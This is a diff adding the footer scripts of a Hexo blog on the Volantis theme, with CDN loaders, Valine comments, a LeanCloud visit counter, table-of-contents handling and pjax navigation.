+        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
+</div>
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        Use
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.2.0" target="_blank" class="codename">Volantis</a>
+        as theme
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2020-2021 1ss4k</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+      <a id="s-top" class="fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+    </div>
+  </div>
+  <div>
+    <script>
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/********************脚本懒加载函数********************************/
+function loadScript(src, cb) {
+var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+var script = document.createElement('script');
+script.setAttribute('type','text/javascript');
+if (cb) script.onload = cb;
+script.setAttribute('src', src);
+HEAD.appendChild(script);
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    setTimeout(function() {
+      loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+    }, 1);
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+</script>
+
+
+<!-- internal -->
+
+
+
+
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+  
+    <script>
+      window.FPConfig = {
+        delay: 0,
+        ignoreKeywords: [],
+        maxRPS: 5,
+        hoverDelay: 25
+      };
+    </script>
+    <script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    if(!document.querySelectorAll("#valine_container")[0])return;
+
+    let pagePlaceholder = pdata.commentPlaceholder || "快来评论吧~";
+
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: path,
+      appId: "",
+      appKey: "",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      recordIP: 'false',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('/js/search/hexo.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'u9j57bwJod4EDmXWdxrwuqQT-MdYXbMMI',
+    app_key: 'jfHtEKVE24j0IVCGHbvuFClp',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'http://example.com' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'http://example.com' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'http://example.com' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#l_cover",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+       
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+	 
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+          if (typeof $.fancybox == "undefined") {
+            SCload_fancybox();
+          } else {
+            pjax_fancybox();
+          }
+        
+        
+        
+        
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+	  
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
